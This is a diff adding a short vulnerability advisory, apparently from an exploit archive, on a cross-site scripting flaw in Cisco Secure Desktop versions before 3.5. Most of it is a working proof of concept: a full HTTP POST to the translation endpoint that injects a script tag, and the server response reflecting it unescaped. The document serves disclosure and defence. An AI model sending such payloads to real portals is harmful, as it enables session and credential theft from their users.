@@ -1,0 +1,36 @@
+source: http://www.securityfocus.com/bid/37960/info
+
+Cisco Secure Desktop is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.
+
+Versions prior to Cisco Secure Desktop 3.5 are vulnerable. 
+
+REQUEST:
+POST https://www.example.com/+CSCOT+/translation?textdomain=csd&prefix=trans&lang=en-us HTTP/1.1 
+Host: www.example.com 
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9) Gecko/2008052906 Firefox/3.0 (.NET CLR 3.5.30729) 
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 
+Accept-Language: en-us,en;q=0.5 Accept-Encoding: gzip,deflate Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7 
+Keep-Alive: 300 
+Connection: keep-alive 
+Referer: https://www.example.com/CACHE/sdesktop/install/start.htm 
+Content-Type: application/xml; charset=UTF-8 
+Cookie: webvpnLang=en-us; webvpnlogin=1
+Pragma: no-cache 
+Cache-Control: no-cache 
+Content-Length: 56
+
+Starting, please wait..."><script>alert(1);</script>
+
+RESPONSE:
+HTTP/1.1 200 OK 
+Server: Cisco AWARE 2.0 
+Content-Type: text/html; charset=UTF-8 
+Cache-Control: no-cache 
+Pragma: no-cache 
+Connection: Keep-Alive 
+Date: Mon, 16 Nov 2009 14:14:07 GMT
+Content-Length: 122
+
+trans["Starting, please wait...\"><script>alert(1);</script>"] = "Starting, please wait...\"><script>alert(1);</script>";
